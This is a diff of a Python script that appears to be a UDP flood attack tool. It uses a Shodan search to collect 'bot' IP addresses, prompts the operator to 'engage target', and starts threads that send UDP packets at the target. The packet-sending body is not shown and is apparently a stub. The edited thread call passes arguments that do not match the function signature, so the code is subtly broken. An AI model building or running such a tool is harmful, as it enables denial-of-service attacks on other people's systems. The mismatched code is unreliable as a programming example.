@@ -84,7 +84,7 @@ def display_bots(api_key, ip_list=None):
         time.sleep(1.1 - ((time.time() - starttime) % 1.1))
 
 
-def send_udp_packet(target, target_port, data, power, iface=None):
+def send_udp_packet(target, target_port, data, power, setdata, getdata, iface=None):
     try:
         print(f'[Thread {threading. current_thread(). name}] Started for target: {target}')
         # Simulate work with sleep
@@ -108,36 +108,31 @@ def send_udp_packet(target, target_port, data, power, iface=None):
         print(f'[Thread {threading. current_thread(). name}] Error: {e}')
 
 
+
 def main():
     global SHODAN_API_KEY
     target, target_port, power, data, setdata, getdata = prepare_attack()
-    #target, target_port, power, data = "127. 0. 0. 1", 80, 10, "data"
     print('[*] Ready to engage target %s? <Y/n>: ' % target, end='')
-    engage = input(). lower()
+    engage = input().lower()
     load_shodan_api_key()
     results = search_shodan(SHODAN_API_KEY)
-    if engage. startswith('y'):
+    if engage.startswith('y'):
         threads = []
         iface = 'Atheros AR9271 Wireless Network Adapter'  # Specify the interface outside the loop
-        ip_list = [result['ip_str'] for result in results['matches']]
-    for _ in ip_list:  # Loop over ip_list without using the ip variable
-        thread = threading.Thread(target=send_udp_packet, args=(target_port, data, power, setdata, getdata, iface))
-        threads.append(thread)
-        thread.start()
+        bot_list = [result['ip_str'] for result in results['matches']]
+        for bot_ip in bot_list:
+            thread = threading.Thread(target=send_udp_packet, args=(target, target_port, data, getdata, power, iface))
+            threads.append(thread)
+            thread.start()
 
         # Wait for all threads to complete
         for thread in threads:
-            thread. join()
-            print('[•] Task complete! Exiting Platform.  Have a wonderful day. ')
-            
-        print('')
-        print('[•] Task complete! Exiting Platform.  Have a wonderful day. ')
+            thread.join()
+            print('[•] Task complete! Exiting Platform.  Have a wonderful day.')
+
     else:
-        print('')
         print('[✘] Error: %s not engaged!' % target)
-        print('[~] Restarting Platform! Please wait. ')
-        print('')
-     
+        print('[~] Restarting Platform! Please wait.')
+
 if __name__ == "__main__":
     main()
-
